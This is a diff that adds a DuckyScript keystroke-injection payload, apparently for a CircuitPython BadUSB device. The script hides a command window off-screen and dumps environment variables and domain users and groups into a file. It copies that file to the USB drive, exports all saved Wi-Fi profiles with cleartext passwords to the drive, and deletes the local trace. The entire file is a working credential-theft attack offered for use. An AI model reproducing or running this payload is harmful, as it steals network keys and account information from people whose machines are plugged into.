@@ -1,0 +1,50 @@
+DELAY 2500
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 500
+STRING mode con:cols=15 lines=1
+ENTER
+STRING color FE
+ENTER
+ALT SPACE
+STRING m
+LEFTARROW
+REPEAT 30
+ENTER
+STRING echo [*] Obteniendo datos del sistema ... >> winPwn.txt
+ENTER
+DELAY 200
+STRING set >> winPwn.txt
+ENTER
+STRING cls
+ENTER
+DELAY 200
+STRING echo [*] Obteniendo informacion adicional ... >> winPwn.txt
+ENTER
+DELAY 200
+STRING net users /domain >> winPwn.txt
+ENTER
+DELAY 2500
+STRING net groups /domain >> winPwn.txt
+ENTER
+DELAY 1500
+STRING cls
+ENTER
+STRING echo [*] Informacion capturada con exito! >> winPwn.txt
+ENTER
+STRING for /f "tokens=3" %a in ('"wmic logicaldisk where drivetype=2 get deviceid, volumename, description" ^| findstr CIRCUITPY'); do mkdir %a\%USERNAME%
+ENTER
+DELAY 950
+STRING for /f "tokens=3" %a in ('"wmic logicaldisk where drivetype=2 get deviceid, volumename, description" ^| findstr CIRCUITPY'); do copy winPwn.txt %a\%USERNAME%\%USERNAME%.txt /y
+ENTER
+DELAY 600
+STRING for /f "tokens=3" %a in ('"wmic logicaldisk where drivetype=2 get deviceid, volumename, description" ^| findstr CIRCUITPY'); do netsh wlan export profile folder=%a\%USERNAME% key="clear"
+REM move winPwn.txt D:\winPwn.txt 
+ENTER
+DELAY 2500
+STRING del winPwn.txt
+ENTER
+STRING exit
+ENTER
